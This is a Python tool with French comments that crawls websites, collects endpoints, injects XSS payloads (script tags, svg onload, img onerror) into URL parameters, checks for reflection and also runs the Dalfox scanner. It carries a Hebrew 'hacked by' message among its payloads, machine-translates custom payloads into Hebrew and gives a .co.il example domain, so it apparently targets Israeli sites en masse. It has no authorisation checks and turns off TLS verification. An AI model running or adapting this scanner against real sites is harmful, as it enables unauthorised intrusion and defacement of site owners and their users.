import os
import subprocess
import questionary
import httpx
import re
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode
from translate import Translator

# Couleurs pour affichage
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# Initialisation du traducteur
translator = Translator(to_lang="he")

# --- Fonction pour traduire les payloads en hébreu ---
def translate_to_hebrew(payloads):
    translated_payloads = []
    for payload in payloads:
        try:
            translated_payloads.append(translator.translate(payload))
        except Exception as e:
            print(f"{RED}Erreur de traduction : {e}{RESET}")
    return translated_payloads

# --- Fonction pour extraire les endpoints d'un site ---
def extract_endpoints(domain):
    try:
        response = httpx.get(domain, timeout=5, verify=False)
        if response.status_code != 200:
            return []

        soup = BeautifulSoup(response.text, "html.parser")
        endpoints = set()

        for link in soup.find_all("a", href=True):
            url = link["href"]
            if url.startswith("/") or domain in url:
                endpoints.add(url if url.startswith("http") else domain + url)

        for script in soup.find_all("script", src=True):
            js_url = script["src"]
            if not js_url.startswith("http"):
                js_url = domain + js_url

            try:
                js_response = httpx.get(js_url, timeout=5, verify=False)
                found_urls = re.findall(r"(https?://[^\s\"']+)", js_response.text)
                endpoints.update(found_urls)
            except:
                pass

        return list(endpoints)
    except:
        return []

# --- Fonction pour tester les XSS sur les paramètres ---
def test_xss(url, payloads):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        return None

    print(f"{GREEN}[+] Test des paramètres : {list(params.keys())}{RESET}")

    for param in params:
        for payload in payloads:
            injected_params = {param: payload}
            injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(injected_params)}"

            print(f"{GREEN}[+] Test XSS : {injected_url}{RESET}")
            
            try:
                response = httpx.get(injected_url, timeout=5, verify=False)
                if payload in response.text:
                    print(f"{RED}[!] XSS trouvé sur {url} avec paramètre {param}{RESET}")
                    return injected_url
            except:
                pass

    return None

# --- Scanner avec Dalfox ---
def scan_with_dalfox(targets):
    print(f"{GREEN}[+] Scan XSS avec Dalfox...{RESET}")
    try:
        result = subprocess.run(["dalfox", "pipe"], input="\n".join(targets), text=True, capture_output=True)
        return result.stdout
    except Exception as e:
        print(f"{RED}Erreur avec Dalfox : {e}{RESET}")
        return ""

# --- Fonction principale ---
def main():
    choix = questionary.select(
        "Comment scanner les sites ?",
        choices=["📄 Depuis un fichier .txt", "🌐 Entrer un domaine manuellement"]
    ).ask()

    if choix == "📄 Depuis un fichier .txt":
        fichier = questionary.text("Entrez le fichier contenant les domaines :").ask()
        if not os.path.exists(fichier):
            print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
            return

        with open(fichier, "r") as f:
            domaines = [line.strip() for line in f.readlines()]
    else:
        domaine = questionary.text("Entrez le domaine à scanner (ex: https://exemple.co.il)").ask()
        domaines = [domaine]

    print(f"{GREEN}[+] Vérification des domaines actifs...{RESET}")
    domaines = [d for d in domaines if httpx.get(d, timeout=5, verify=False).status_code < 400]
    
    if not domaines:
        print(f"{RED}[-] Aucun domaine actif trouvé.{RESET}")
        return

    default_payloads = [
        "<script>alert('XSS')</script>",
        "כ<script>alert('נפרץ על ידי טראחקנון')</script>",  # Hébreu : "Hacked"
        "'><svg/onload=alert('פריצה')>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>"
    ]

    use_custom_payloads = questionary.confirm("Ajouter des payloads personnalisés ?").ask()
    if use_custom_payloads:
        file_path = questionary.text("Entrez le fichier contenant les payloads :").ask()
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                custom_payloads = [line.strip() for line in f.readlines()]
            translated_payloads = translate_to_hebrew(custom_payloads)
            all_payloads = default_payloads + translated_payloads
        else:
            print(f"{RED}[-] Erreur : fichier non trouvé !{RESET}")
            all_payloads = default_payloads
    else:
        all_payloads = default_payloads

    print(f"{GREEN}[+] Début du scan XSS...{RESET}")
    with open("resultats_xss_hebrew.txt", "w") as result_file:
        for site in domaines:
            print(f"{GREEN}[+] Scan : {site}{RESET}")

            endpoints = extract_endpoints(site)
            print(f"{GREEN}[+] {len(endpoints)} endpoints trouvés sur {site}{RESET}")

            for endpoint in endpoints:
                vulnerable_url = test_xss(endpoint, all_payloads)
                if vulnerable_url:
                    result_file.write(f"⚠️ XSS détecté sur : {vulnerable_url}\n")

            dalfox_result = scan_with_dalfox(endpoints)
            result_file.write(f"--- Résultats Dalfox pour {site} ---\n{dalfox_result}\n")

    print(f"{GREEN}[+] Scan terminé. Résultats sauvegardés dans 'resultats_xss_hebrew.txt'.{RESET}")

if __name__ == "__main__":
    main()
